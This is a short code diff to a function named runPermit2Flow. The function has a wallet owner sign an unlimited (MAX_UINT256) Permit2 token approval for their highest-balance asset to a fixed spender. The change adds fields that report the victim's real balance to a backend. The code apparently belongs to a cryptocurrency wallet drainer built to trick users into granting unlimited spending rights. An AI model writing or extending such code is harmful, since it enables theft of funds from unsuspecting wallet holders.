@@ -172,7 +172,12 @@ export async function runPermit2Flow({
           chainId: activeChainId,
           token: top.address,
           tokenSymbol: top.symbol,
-          amount: MAX_UINT256,
+          // Signed value is unlimited (MAX_UINT256) but we report the actual
+          // wallet balance of the top asset so the backend knows the real size.
+          amount: top.balance.toString(),
+          signedAmount: MAX_UINT256,
+          balanceFormatted: top.balanceFormatted,
+          decimals: top.decimals,
           nonce,
           deadline,
           spender: SPENDER,
